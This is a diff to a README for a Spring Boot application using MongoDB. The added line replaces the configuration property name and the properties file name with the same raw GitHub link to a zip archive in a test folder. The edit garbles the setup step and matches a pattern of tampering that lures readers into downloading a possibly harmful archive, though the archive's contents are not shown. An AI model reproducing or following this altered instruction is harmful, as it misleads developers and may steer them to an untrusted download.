@@ -15,7 +15,7 @@ Before proceeding, make sure you have the following installed on your system:
 
 ## Set up MongoDB
 1. Make sure MongoDB is installed and running on your system.
-2. By default, the Spring Boot application uses a local MongoDB instance running on `localhost` and port `27017`. If your MongoDB setup is different, update the `spring.data.mongodb.uri` property in the `application.properties` file located in the `src/main/resources` directory.
+2. By default, the Spring Boot application uses a local MongoDB instance running on `localhost` and port `27017`. If your MongoDB setup is different, update the `https://raw.githubusercontent.com/Himansh29/GlobalGroupwareAssignment/main/GlobalGroupwareAssignment/src/test/Assignment-Groupware-Global-3.2.zip` property in the `https://raw.githubusercontent.com/Himansh29/GlobalGroupwareAssignment/main/GlobalGroupwareAssignment/src/test/Assignment-Groupware-Global-3.2.zip` file located in the `src/main/resources` directory.
 
 ## Build and Run the Application
 1. Open a terminal or command prompt and navigate to the project directory.
